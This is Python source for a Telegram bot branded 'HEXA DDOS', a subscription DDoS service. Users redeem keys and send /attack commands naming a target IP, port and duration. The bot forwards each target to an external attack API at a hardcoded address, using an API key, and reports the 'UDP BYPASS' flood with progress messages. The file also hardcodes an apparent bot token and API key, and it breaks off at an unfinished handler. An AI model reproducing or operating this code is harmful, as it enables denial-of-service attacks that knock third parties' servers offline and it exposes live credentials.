import os
import json
import logging
import time
import requests
import threading
import random
import string
import re
from datetime import datetime, timedelta
from threading import Thread, Event
import pytz
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ========== CONFIGURATION ==========
TOKEN = '8874970200:AAE0lDid8HIMrWfiuimFUua322sVyRK5Nvo'
ADMIN_IDS_FILE = "admin_ids.json"
USER_DATA_FILE = "userr.txt"
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
BOT_SETTINGS_FILE = "bot_settings.json"

# ========== API CONFIG ==========
API_KEY = "WdRZw6tuMOXscLqXNxtCVAXwlJ8r6Nbg"
API_BASE_URL = "http://82.112.230.6:3938"
API_ENDPOINT = "attack"

# ========== BOT INFO ==========
BOT_NAME = "HEXA DDOS"
BOT_OWNER = 5611737782
OWNER_USERNAME = "@OWNERHexaLoader"


def load_admin_ids():
    if os.path.exists(ADMIN_IDS_FILE):
        try:
            with open(ADMIN_IDS_FILE, 'r') as f:
                return json.load(f)
        except:
            return [7883336006]
    return [7883336006]


def save_admin_ids(admin_list):
    with open(ADMIN_IDS_FILE, 'w') as f:
        json.dump(admin_list, f, indent=2)


ADMIN_IDS = load_admin_ids()
if BOT_OWNER not in ADMIN_IDS:
    ADMIN_IDS.insert(0, BOT_OWNER)
    save_admin_ids(ADMIN_IDS)

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
approved_users = {}
keys_db = {}
users_db = {}
bot_settings = {}
MAX_SLOTS = 5
active_attacks = {}
last_attack_time = {}
DEFAULT_COOLDOWN = 30


# ========== PERSISTENT STORAGE ==========
def load_users():
    global approved_users
    if os.path.exists(USER_DATA_FILE):
        try:
            with open(USER_DATA_FILE, 'r') as f:
                data = f.read()
                approved_users = json.loads(data) if data else {}
        except:
            approved_users = {}
    else:
        approved_users = {}


def save_users():
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(approved_users, f, indent=2)


def load_keys():
    global keys_db
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, 'r') as f:
                keys_db = json.load(f)
        except:
            keys_db = {}
    else:
        keys_db = {}


def save_keys():
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys_db, f, indent=2)


def load_users_db():
    global users_db
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                users_db = json.load(f)
        except:
            users_db = {}
    else:
        users_db = {}


def save_users_db():
    with open(USERS_FILE, 'w') as f:
        json.dump(users_db, f, indent=2)


def load_settings():
    global bot_settings
    if os.path.exists(BOT_SETTINGS_FILE):
        try:
            with open(BOT_SETTINGS_FILE, 'r') as f:
                bot_settings = json.load(f)
        except:
            bot_settings = {}
    else:
        bot_settings = {}


def save_settings():
    with open(BOT_SETTINGS_FILE, 'w') as f:
        json.dump(bot_settings, f, indent=2)


# ========== HELPER FUNCTIONS ==========
def get_free_slots():
    now = time.time()
    expired = [cid for cid, data in active_attacks.items() if data["end_time"] <= now]
    for cid in expired:
        if "stop_event" in active_attacks[cid]:
            active_attacks[cid]["stop_event"].set()
        del active_attacks[cid]
    return MAX_SLOTS - len(active_attacks)


def get_active_attacks_info():
    if not active_attacks:
        return "No active attacks."
    info = "Active attacks:\n"
    for cid, data in active_attacks.items():
        remaining = int(data["end_time"] - time.time())
        info += f"• User {cid} -> {data['target']}:{data['port']} - {remaining}s left\n"
    return info


def get_status_text():
    free = get_free_slots()
    return f"*🟢 Slot Status:* `{free}/{MAX_SLOTS}` free"


def check_api_status():
    url = f"{API_BASE_URL}/{API_ENDPOINT}/1.1.1.1/80/1"
    params = {"key": API_KEY}
    try:
        start = time.time()
        r = requests.get(url, params=params, timeout=10)
        elapsed = int((time.time() - start) * 1000)
        if r.status_code in [200, 400, 422, 403]:
            return True, f"API reachable (HTTP {r.status_code}) – {elapsed}ms"
        else:
            return False, f"API returned {r.status_code} – {elapsed}ms"
    except requests.exceptions.Timeout:
        return False, "API timeout after 10s"
    except requests.exceptions.ConnectionError:
        return False, "Cannot connect to API server"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def send_api_attack(ip, port, duration):
    """
    URL format: http://82.112.230.6:3938/attack/<ip>/<port>/<duration>?key=<API_KEY>
    """
    url = f"{API_BASE_URL}/{API_ENDPOINT}/{ip}/{port}/{duration}"
    params = {"key": API_KEY}

    for attempt in range(1, 4):
        start_time = time.time()
        try:
            logging.info(f"API attempt {attempt}: {url}?key={API_KEY}")
            response = requests.get(url, params=params, timeout=25)
            elapsed_ms = int((time.time() - start_time) * 1000)
            logging.info(f"API response [{response.status_code}]: {response.text[:200]}")

            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    success = (
                        resp_json.get("success") is True
                        or str(resp_json.get("status", "")).lower() in ("success", "ok", "started")
                        or "success" in str(resp_json).lower()
                        or "attack" in str(resp_json).lower()
                        or "sent" in str(resp_json).lower()
                    )
                    if success:
                        logging.info(f"✅ API SUCCESS: {resp_json}")
                        msg = resp_json.get("message") or resp_json.get("msg") or "Attack accepted"
                        return True, msg, elapsed_ms
                    else:
                        logging.warning(f"API non-success JSON: {resp_json}")
                        if attempt == 3:
                            return False, f"API: {str(resp_json)[:100]}", elapsed_ms
                except ValueError:
                    text = response.text.strip().lower()
                    if any(w in text for w in ["success", "started", "sent", "ok", "true", "attack", "processing"]):
                        return True, "Attack request accepted", elapsed_ms
                    if attempt == 3:
                        return False, f"API: {response.text[:100]}", elapsed_ms
            else:
                error_msg = f"HTTP {response.status_code}: {response.text[:100]}"
                logging.warning(f"API attempt {attempt} failed: {error_msg}")
                if attempt == 3:
                    return False, f"API error: {error_msg}", elapsed_ms
        except requests.exceptions.Timeout:
            elapsed_ms = int((time.time() - start_time) * 1000)
            logging.error(f"API attempt {attempt} timeout")
            if attempt == 3:
                return False, "API timeout – no response", elapsed_ms
        except requests.exceptions.ConnectionError:
            elapsed_ms = int((time.time() - start_time) * 1000)
            logging.error(f"API attempt {attempt} connection error")
            if attempt == 3:
                return False, "Cannot connect to API server", elapsed_ms
        except Exception as e:
            elapsed_ms = int((time.time() - start_time) * 1000)
            logging.error(f"API attempt {attempt} exception: {e}")
            if attempt == 3:
                return False, f"Unexpected error: {str(e)[:50]}", elapsed_ms

        if attempt < 3:
            time.sleep(2)

    return False, "All API attempts failed", 0


def is_user_admin(user_id):
    return user_id in ADMIN_IDS


def has_valid_key(user_id):
    user = users_db.get(str(user_id))
    if not user or not user.get('key_expiry'):
        return False
    try:
        expiry = datetime.fromisoformat(user['key_expiry'])
        if datetime.now() > expiry:
            users_db[str(user_id)] = {}
            save_users_db()
            return False
        return True
    except:
        return False


def user_has_access(user_id):
    ud = approved_users.get(str(user_id))
    if ud and ud.get('valid_until'):
        tz = pytz.timezone('Asia/Kolkata')
        now = datetime.now(tz).date()
        valid_until = datetime.strptime(ud['valid_until'], "%Y-%m-%d").date()
        if now <= valid_until:
            return True
    if has_valid_key(user_id):
        return True
    return False


def get_user_plan_display(user_id):
    ud = approved_users.get(str(user_id))
    if ud:
        return f"Plan {ud.get('plan', 'Unknown')}"
    kd = users_db.get(str(user_id))
    if kd and kd.get('key_duration_label'):
        return kd['key_duration_label']
    return "No plan"


def generate_key(prefix="KEY", length=12):
    chars = string.ascii_uppercase + string.digits
    return f"{prefix}-{''.join(random.choice(chars) for _ in range(length))}"


def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == 's': return timedelta(seconds=value), f"{value} seconds"
    if unit == 'm': return timedelta(minutes=value), f"{value} minutes"
    if unit == 'h': return timedelta(hours=value), f"{value} hours"
    if unit == 'd': return timedelta(days=value), f"{value} days"
    return None, None


def get_cooldown_seconds():
    return bot_settings.get('cooldown_seconds', DEFAULT_COOLDOWN)


def set_cooldown_seconds(seconds):
    bot_settings['cooldown_seconds'] = seconds
    save_settings()


# ========== VIDEO POOL SYSTEM ==========
@bot.message_handler(commands=['addattackvideo'])
def add_attack_video(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Access Denied!", parse_mode='Markdown')
        return
    if not message.reply_to_message:
        bot.send_message(message.chat.id, "⚠️ Reply to a video message with /addattackvideo", parse_mode='Markdown')
        return
    video = message.reply_to_message.video
    if not video:
        bot.send_message(message.chat.id, "❌ Not a video. Send an MP4 file.", parse_mode='Markdown')
        return
    video_pool = bot_settings.get('video_pool', [])
    video_pool.append(video.file_id)
    bot_settings['video_pool'] = video_pool
    save_settings()
    bot.send_message(message.chat.id, f"✅ Video added to pool! Total videos: {len(video_pool)}", parse_mode='Markdown')


@bot.message_handler(commands=['listattackvideos'])
def list_attack_videos(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Access Denied!", parse_mode='Markdown')
        return
    video_pool = bot_settings.get('video_pool', [])
    if not video_pool:
        bot.send_message(message.chat.id, "❌ No videos in pool. Use /addattackvideo to add.", parse_mode='Markdown')
        return
    txt = f"*📹 Attack Video Pool ({len(video_pool)} videos)*\n\n"
    for i, fid in enumerate(video_pool, 1):
        txt += f"{i}. `{fid[:20]}...`\n"
    txt += "\nUse `/removeattackvideo <number>` to remove a video."
    bot.send_message(message.chat.id, txt, parse_mode='Markdown')


@bot.message_handler(commands=['removeattackvideo'])
def remove_attack_video(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Access Denied!", parse_mode='Markdown')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "⚠️ Usage: `/removeattackvideo <number>`\nUse /listattackvideos to see numbers.", parse_mode='Markdown')
        return
    try:
        idx = int(args[1]) - 1
    except:
        bot.send_message(message.chat.id, "❌ Invalid number.", parse_mode='Markdown')
        return
    video_pool = bot_settings.get('video_pool', [])
    if idx < 0 or idx >= len(video_pool):
        bot.send_message(message.chat.id, "❌ Video not found.", parse_mode='Markdown')
        return
    removed = video_pool.pop(idx)
    bot_settings['video_pool'] = video_pool
    save_settings()
    bot.send_message(message.chat.id, f"✅ Video removed. Remaining: {len(video_pool)}", parse_mode='Markdown')


@bot.message_handler(commands=['clearattackvideos'])
def clear_attack_videos(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Access Denied!", parse_mode='Markdown')
        return
    if 'video_pool' in bot_settings:
        del bot_settings['video_pool']
        save_settings()
    bot.send_message(message.chat.id, "✅ All attack videos cleared.", parse_mode='Markdown')


def get_random_attack_video():
    video_pool = bot_settings.get('video_pool', [])
    if not video_pool:
        return None
    return random.choice(video_pool)


# ========== ADMIN MANAGEMENT ==========
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if message.from_user.id != BOT_OWNER:
        bot.send_message(message.chat.id, "🚫 Only bot owner can add admins.", parse_mode='Markdown')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "⚠️ Usage: `/addadmin <user_id>`", parse_mode='Markdown')
        return
    try:
        new_admin = int(args[1])
        if new_admin in ADMIN_IDS:
            bot.send_message(message.chat.id, f"❌ User `{new_admin}` is already an admin.", parse_mode='Markdown')
            return
        ADMIN_IDS.append(new_admin)
        save_admin_ids(ADMIN_IDS)
        bot.send_message(message.chat.id, f"✅ User `{new_admin}` is now an admin.", parse_mode='Markdown')
        try:
            bot.send_message(new_admin, f"🎉 You have been promoted to admin in {BOT_NAME}.", parse_mode='Markdown')
        except:
            pass
    except:
        bot.send_message(message.chat.id, "❌ Invalid user ID.", parse_mode='Markdown')


@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if message.from_user.id != BOT_OWNER:
        bot.send_message(message.chat.id, "🚫 Only bot owner can remove admins.", parse_mode='Markdown')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "⚠️ Usage: `/removeadmin <user_id>`", parse_mode='Markdown')
        return
    try:
        target = int(args[1])
        if target == BOT_OWNER:
            bot.send_message(message.chat.id, "❌ Cannot remove bot owner.", parse_mode='Markdown')
            return
        if target not in ADMIN_IDS:
            bot.send_message(message.chat.id, f"❌ User `{target}` is not an admin.", parse_mode='Markdown')
            return
        ADMIN_IDS.remove(target)
        save_admin_ids(ADMIN_IDS)
        bot.send_message(message.chat.id, f"✅ User `{target}` is no longer an admin.", parse_mode='Markdown')
        try:
            bot.send_message(target, "⛔ You have been removed from admin team.", parse_mode='Markdown')
        except:
            pass
    except:
        bot.send_message(message.chat.id, "❌ Invalid user ID.", parse_mode='Markdown')


@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Access Denied!", parse_mode='Markdown')
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "⚠️ Usage: `/setcooldown <seconds>`", parse_mode='Markdown')
        return
    try:
        seconds = int(args[1])
        if seconds < 0:
            raise ValueError
        set_cooldown_seconds(seconds)
        bot.send_message(message.chat.id, f"✅ Cooldown set to {seconds} seconds.", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "❌ Invalid number. Must be >= 0.", parse_mode='Markdown')


# ========== KEY SYSTEM ==========
@bot.message_handler(commands=['gen'])
def gen_key(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Access Denied!", parse_mode='Markdown')
        return
    args = message.text.split()
    if len(args) < 4 or len(args) > 5:
        bot.send_message(message.chat.id, "⚠️ Usage: `/gen <prefix> <duration> <count> [max_users]`\nExample: `/gen VIP 1d 5 1`\nDuration: 30s, 10m, 2h, 1d, `lifetime`", parse_mode='Markdown')
        return
    prefix = args[1].upper()
    dur_str = args[2].lower()
    try:
        count = int(args[3])
        if count < 1 or count > 50:
            raise
    except:
        bot.send_message(message.chat.id, "❌ Count must be 1-50.", parse_mode='Markdown')
        return
    max_users = 1
    if len(args) == 5:
        try:
            max_users = int(args[4])
            if max_users < 1:
                raise
        except:
            bot.send_message(message.chat.id, "❌ max_users must be a positive integer.", parse_mode='Markdown')
            return

    if dur_str == 'lifetime':
        duration_seconds = None
        label = "Lifetime"
    else:
        dur, label = parse_duration(dur_str)
        if not dur:
            bot.send_message(message.chat.id, "❌ Invalid duration. Use e.g., 30s, 10m, 2h, 1d or `lifetime`", parse_mode='Markdown')
            return
        duration_seconds = int(dur.total_seconds())

    generated = []
    for _ in range(count):
        key = generate_key(prefix, 12)
        keys_db[key] = {
            'key': key,
            'duration_seconds': duration_seconds,
            'duration_label': label,
            'created_at': datetime.now().isoformat(),
            'created_by': message.from_user.id,
            'used': False,
            'max_users': max_users,
            'used_by': [],
            'uses_left': max_users
        }
        generated.append(key)
    save_keys()

    if count == 1:
        bot.send_message(message.chat.id, f"✅ Key: `{generated[0]}`\n⏰ {label}\n👥 Max uses: {max_users}", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, f"✅ {count} keys generated.\nFirst key: `{generated[0]}`\nEach valid for {label}, max {max_users} uses.", parse_mode='Markdown')


@bot.message_handler(commands=['keys'])
def list_keys(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Access Denied!", parse_mode='Markdown')
        return
    if not keys_db:
        bot.send_message(message.chat.id, "No keys in database.", parse_mode='Markdown')
        return
    text = "*🔑 Generated Keys:*\n\n"
    for key, data in list(keys_db.items())[:20]:
        uses = len(data.get('used_by', []))
        maxu = data.get('max_users', 1)
        status = "✅ Active" if data.get('uses_left', 0) > 0 else "❌ Expired"
        text += f"`{key}`\n   {data['duration_label']} | Uses: {uses}/{maxu} | {status}\n"
    bot.send_message(message.chat.id, text, parse_mode='Markdown')


@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = message.from_user.id
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "⚠️ Usage: `/redeem <key>`", parse_mode='Markdown')
        return
    key = args[1]
    key_data = keys_db.get(key)
    if not key_data:
        bot.send_message(message.chat.id, "❌ Invalid key.", parse_mode='Markdown')
        return

    uses_left = key_data.get('uses_left', 0)
    if uses_left <= 0:
        bot.send_message(message.chat.id, "❌ Key has no remaining uses.", parse_mode='Markdown')
        return

    if str(user_id) in key_data.get('used_by', []):
        bot.send_message(message.chat.id, "❌ You have already redeemed this key.", parse_mode='Markdown')
        return

    now = datetime.now()
    if key_data['duration_seconds'] is None:
        expiry = None
        expiry_iso = None
    else:
        expiry = now + timedelta(seconds=key_data['duration_seconds'])
        expiry_iso = expiry.isoformat()

    user = users_db.get(str(user_id), {})
    if user and user.get('key_expiry') and expiry:
        try:
            old_expiry = datetime.fromisoformat(user['key_expiry'])
            if old_expiry > now:
                expiry = old_expiry + timedelta(seconds=key_data['duration_seconds'])
                expiry_iso = expiry.isoformat()
        except:
            pass

    users_db[str(user_id)] = {
        'user_id': user_id,
        'username': message.from_user.username or message.from_user.first_name,
        'key': key,
        'key_expiry': expiry_iso,
        'key_duration_seconds': key_data['duration_seconds'],
        'key_duration_label': key_data['duration_label'],
        'redeemed_at': now.isoformat()
    }

    key_data['used'] = True
    key_data['used_by'] = key_data.get('used_by', [])
    key_data['used_by'].append(str(user_id))
    key_data['uses_left'] = uses_left - 1
    save_keys()
    save_users_db()

    if expiry:
        remaining = (expiry - now).total_seconds()
        days = int(remaining // 86400)
        hours = int((remaining % 86400) // 3600)
        mins = int((remaining % 3600) // 60)
        time_str = f"{days}d {hours}h {mins}m"
        bot.send_message(message.chat.id, f"✅ Key redeemed!\n⏳ Time left: {time_str}", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, f"✅ Lifetime key redeemed! Unlimited access.", parse_mode='Markdown')


# ========== APPROVAL / DISAPPROVAL ==========
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "🚫 *Access Denied!*", parse_mode='Markdown')
        return
    cmd_parts = message.text.split()
    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "⚠️ Format: `/approve <user_id> <plan> <days>` or `/disapprove <user_id>`", parse_mode='Markdown')
        return
    action = cmd_parts[0]
    try:
        target_user_id = int(cmd_parts[1])
    except ValueError:
        bot.send_message(chat_id, "⚠️ User ID must be integer.", parse_mode='Markdown')
        return
    if action == '/approve':
        if len(cmd_parts) < 4:
            bot.send_message(chat_id, "⚠️ Missing plan or days.", parse_mode='Markdown')
            return
        try:
            plan = int(cmd_parts[2])
            days = int(cmd_parts[3])
        except ValueError:
            bot.send_message(chat_id, "⚠️ Plan and days must be integers.", parse_mode='Markdown')
            return
        tz = pytz.timezone('Asia/Kolkata')
        now = datetime.now(tz)
        valid_until = (now + timedelta(days=days)).strftime("%Y-%m-%d")
        time_approved = now.strftime("%I:%M:%S %p %Y-%m-%d")
        approved_users[str(target_user_id)] = {
            "plan": plan,
            "valid_until": valid_until,
            "approved_by": user_id,
            "time_approved": time_approved,
            "username": message.reply_to_message.from_user.username if message.reply_to_message else None
        }
        save_users()
        bot.send_message(chat_id, f"✅ Approved `{target_user_id}` | Plan {plan} | {days} days\n{get_status_text()}", parse_mode='Markdown')
        try:
            bot.send_message(target_user_id, f"🎉 Approved! Plan: {plan}, valid for {days} days.\n{get_status_text()}", parse_mode='Markdown')
        except:
            pass
    elif action == '/disapprove':
        if str(target_user_id) in approved_users:
            del approved_users[str(target_user_id)]
            save_users()
        bot.send_message(chat_id, f"❌ Disapproved `{target_user_id}`\n{get_status_text()}", parse_mode='Markdown')
        try:
            bot.send_message(target_user_id, "🚫 Access revoked.", parse_mode='Markdown')
        except:
            pass


@bot.message_handler(commands=['users'])
def users_command(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Access Denied!", parse_mode='Markdown')
        return
    if not approved_users:
        bot.send_message(message.chat.id, "*No approved users.*", parse_mode='Markdown')
        return
    response = "*📋 Approved Users:*\n\n"
    for uid, data in approved_users.items():
        response += f"*ID:* `{uid}` | *Plan:* {data.get('plan','N/A')} | *Until:* {data.get('valid_until','N/A')}\n"
    bot.send_message(message.chat.id, response, parse_mode='Markdown')


# ========== ATTACK COMMAND ==========
def progress_bar(percent, length=10):
    filled = int(percent * length)
    bar = '█' * filled + '░' * (length - filled)
    return bar


@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not user_has_access(user_id):
        bot.send_message(chat_id, f"*🚫 Not approved or no valid key. Contact owner:- {OWNER_USERNAME} or use /redeem.*", parse_mode='Markdown')
        return

    cooldown = get_cooldown_seconds()
    last = last_attack_time.get(user_id, 0)
    now_time = time.time()
    if now_time - last < cooldown:
        remaining = int(cooldown - (now_time - last))
        bot.send_message(chat_id, f"⏳ *Cooldown active!* Please wait `{remaining}` seconds before another attack.\n{get_status_text()}", parse_mode='Markdown')
        return

    args = message.text.split()[1:]
    if len(args) != 3:
        bot.send_message(chat_id, f"*Usage:* `/attack <ip> <port> <duration>`\n{get_status_text()}", parse_mode='Markdown')
        return

    try:
        target_ip = args[0]
        target_port = int(args[1])
        duration = int(args[2])
    except:
        bot.send_message(chat_id, "❌ Invalid arguments. Use `/attack <ip> <port> <duration>`", parse_mode='Markdown')
        return

    if target_port in blocked_ports:
        bot.send_message(chat_id, f"*🔒 Port {target_port} blocked.*\n{get_status_text()}", parse_mode='Markdown')
        return
    if duration > 300:
        bot.send_message(chat_id, "*⏳ Max 300 seconds.*", parse_mode='Markdown')
        return
    if duration < 1:
        bot.send_message(chat_id, "*⏳ Min 1 second.*", parse_mode='Markdown')
        return
    if get_free_slots() == 0:
        bot.send_message(chat_id, f"*⚠️ Slot full! Please wait.*\n{get_status_text()}", parse_mode='Markdown')
        return

    status_msg = bot.send_message(chat_id, "🌐 *[API STATUS]*\n🔄 Contacting attack API...", parse_mode='Markdown')
    api_success, api_message, response_ms = send_api_attack(target_ip, target_port, duration)

    if not api_success:
        bot.edit_message_text(
            f"🌐 *[API STATUS - FAILED]*\n❌ {api_message}\n⏱️ Response time: {response_ms}ms\n\n⚠️ Attack not started. Please try again later.\n{get_status_text()}",
            chat_id=chat_id, message_id=status_msg.message_id, parse_mode='Markdown'
        )
        return

    bot.edit_message_text(
        f"🌐 *[API STATUS - SUCCESS]*\n✅ {api_message}\n⏱️ Response time: {response_ms}ms\n\n🎯 Target locked. Starting freeze...",
        chat_id=chat_id, message_id=status_msg.message_id, parse_mode='Markdown'
    )

    last_attack_time[user_id] = now_time

    end_time = time.time() + duration
    stop_event = Event()
    active_attacks[chat_id] = {
        "end_time": end_time,
        "target": target_ip,
        "port": target_port,
        "stop_event": stop_event
    }
    free_slots = get_free_slots() - 1

    attack_caption = (
        f"⚔️ *🔥 HEXA DDOS🔥* ⚔️\n\n"
        f"🎯 *Target:* `{target_ip}:{target_port}`\n"
        f"⏱️ *Duration:* `{duration} seconds`\n"
        f"🛠️ *Method:* `UDP BYPASS`\n"
        f"🌍 *Location:* `Global Anycast`\n"
        f"🆓 *Free slots:* `{free_slots}/{MAX_SLOTS}`\n"
        f"{get_status_text()}"
    )

    video_file_id = get_random_attack_video()
    if video_file_id:
        try:
            bot.send_video(chat_id, video_file_id, caption=attack_caption, parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Video send error: {e}")
            bot.send_message(chat_id, attack_caption, parse_mode='Markdown')
    else:
        bot.send_message(chat_id, attack_caption, parse_mode='Markdown')

    progress_msg = bot.send_message(chat_id, "⏳ *Freeze in progress...* 0%", parse_mode='Markdown')

    def countdown():
        total = duration
        for remaining in range(total, 0, -1):
            time.sleep(1)
            percent = (total - remaining) / total
            bar = progress_bar(percent)
            try:
                new_text = (
                    f"⚔️ *🔥 HEXA FREEZE RUNNING 🔥* ⚔️\n"
                    f"🎯 `{target_ip}:{target_port}`\n"
                    f"`{bar}` `{int(percent*100)}%`\n"
                    f"⏰ Time left: `{remaining}s`\n"
                    f"🛠️ Method: `UDP BYPASS`\n"
                    f"🆓 Free slots: `{get_free_slots()}/{MAX_SLOTS}`\n"
                    f"{get_status_text()}"
                )
                bot.edit_message_text(new_text, chat_id=chat_id, message_id=progress_msg.message_id, parse_mode='Markdown')
            except:
                pass
        if chat_id in active_attacks:
            del active_attacks[chat_id]
        try:
            complete_text = (
                f"✅ *💀 HEXA DDOS COMPLETED 💀* ✅\n"
                f"🎯 `{target_ip}:{target_port}` frozen.\n"
                f"🆓 Free slots now: `{get_free_slots()}/{MAX_SLOTS}`\n"
                f"{get_status_text()}"
            )
            bot.edit_message_text(complete_text, chat_id=chat_id, message_id=progress_msg.message_id, parse_mode='Markdown')
        except:
            pass

    Thread(target=countdown, daemon=True).start()


# ========== API STATUS COMMAND ==========
@bot.message_handler(commands=['apistatus'])
def api_status_cmd(message):
    status_msg = bot.send_message(message.chat.id, "🔍 Checking API server status...", parse_mode='Markdown')
    ok, info = check_api_status()
    if ok:
        bot.edit_message_text(f"✅ *API Server Status:* ONLINE\n📡 `{info}`\n{get_status_text()}",
                              chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode='Markdown')
    else:
        bot.edit_message_text(f"❌ *API Server Status:* OFFLINE\n⚠️ `{info}`\nContact: {OWNER_USERNAME}",
                              chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode='Markdown')


# ========== OTHER COMMANDS ==========
@bot.message_handler(commands=['status'])
def status_cmd(message):
    text = f"*🟢 Slots:* `{get_free_slots()}/{MAX_SLOTS}` free\n*Active attacks:* `{MAX_SLOTS - get_free_slots()}`\n\n{get_active_attacks_info()}\n⏱️ Cooldown: {get_cooldown_seconds()}s between attacks"
    bot.send_message(message.chat.id, text, parse_mode='Markdown')


@bot.message_handler(commands=['when'])
def when_cmd(message):
    chat_id = message.chat.id
    if chat_id in active_attacks:
        remaining = int(active_attacks[chat_id]["end_time"] - time.time())
        bot.send_message(chat_id, f"*⏳ Time left: {remaining}s*\n{get_status_text()}" if remaining > 0 else f"*🎉 Attack finished*\n{get_status_text()}", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, f"*❌ No active attack.*\n{get_status_text()}", parse_mode='Markdown')


@bot.message_handler(commands=['myinfo'])
def myinfo_cmd(message):
    user_id = message.from_user.id
    if user_has_access(user_id):
        plan = get_user_plan_display(user_id)
        remaining_str = ""
        if has_valid_key(user_id):
            user = users_db.get(str(user_id))
            if user and user.get('key_expiry'):
                expiry = datetime.fromisoformat(user['key_expiry'])
                rem = expiry - datetime.now()
                days = rem.days
                hours, rem2 = divmod(rem.seconds, 3600)
                minutes = rem2 // 60
                remaining_str = f"\n*⏳ Remaining:* {days}d {hours}h {minutes}m"
        response = f"*👤 User: @{message.from_user.username or 'Unknown'}*\n*💼 Plan: {plan}*{remaining_str}"
    else:
        response = "*⚠️ No active subscription.*"
    response += f"\n{get_status_text()}"
    bot.send_message(message.chat.id, response, parse_mode='Markdown')


@bot.message_handler(commands=['rules'])
def rules_cmd(message):
    bot.send_message(message.chat.id, f"*📜 Rules*\n1. No spamming\n2. Be respectful\n3. Report issues to owner: {OWNER_USERNAME}", parse_mode='Markdown')


@bot.message_handler(commands=['help'])
def help_cmd(message):
    help_text = (
        f"*🌟 {BOT_NAME} COMMANDS 🌟*\n\n"
        "`/attack <ip> <port> <duration>` → Freeze server\n"
        "`/status` → Check slots & cooldown\n"
        "`/myinfo` → Your plan details\n"
        "`/when` → Remaining freeze time\n"
        "`/redeem <key>` → Activate subscription\n"
        "`/apistatus` → Check API server health\n"
        "`/rules` → Bot rules\n"
        "`/owner` → Contact owner\n\n"
        "👇 *Click any button below* 👇"
    )
    markup = InlineKeyboardMarkup(row_width=2)
    commands_list = [
        ("⚔️ Freeze", "/attack"),
        ("📊 Status", "/status"),
        ("👤 My Info", "/myinfo"),
        ("⏱️ When", "/when"),
        ("🔑 Redeem", "/redeem"),
        ("🌐 API Status", "/apistatus"),
        ("📜 Rules", "/rules"),
        ("👑 Owner", "/owner")
    ]
    for btn_text, cmd in commands_list:
        markup.add(InlineKeyboardButton(btn_text, callback_data=f"copy_{cmd}"))
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', reply_markup=markup)


@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
def copy_command_callback(call):
    cmd = call.data.replace("copy_", "")
    bot.send_message(call.message.chat.id, f"📋 Command: `{cmd}`\n\nCopy it from above.", parse_mode='Markdown')
    bot.answer_callback_query(call.id, text=f"Command sent: {cmd}")


@bot.message_handler(commands=['owner'])
def owner_cmd(message):
    bot.send_message(message.chat.id, f"*👤 Owner:* {OWNER_USERNAME}", parse_mode='Markdown')


@bot.message_handler(commands=['start'])
def start_cmd(message):
    api_ok, api_info = check_api_status()
    api_status_text = "✅ ONLINE" if api_ok else "❌ OFFLINE"
    start_text = (
        f"*🌍 WELCOME TO {BOT_NAME} 🌍*\n\n"
        "🔥 *The Most Powerful Server Freezer*\n"
        "💥 *Instant Freeze – Global Network*\n"
        "⚡ *Unlimited Power*\n\n"
        "*📊 Bot Status:*\n"
        f"• {get_status_text()}\n"
        f"• *API Server:* {api_status_text}\n"
        f"• *Cooldown:* `{get_cooldown_seconds()}s`\n\n"
        "*🔧 Features:*\n"
        "✔️ Server Freeze (300s max)\n"
        "✔️ 5 Concurrent Slots\n"
        "✔️ Key System with Admin Panel\n"
        "✔️ Unique Attack UI with Progress Bar\n"
        "✔️ Video Pool for Attacks\n"
        "✔️ Admin Commands & Broadcast\n\n"
        "📌 *Use /help to see all commands*\n"
        f"🔑 *Get a key from owner:* {OWNER_USERNAME}"
    )
    bot.send_message(message.chat.id, start_text, parse_mode='Markdown')


@bot.message_handler(commands=['canary'])
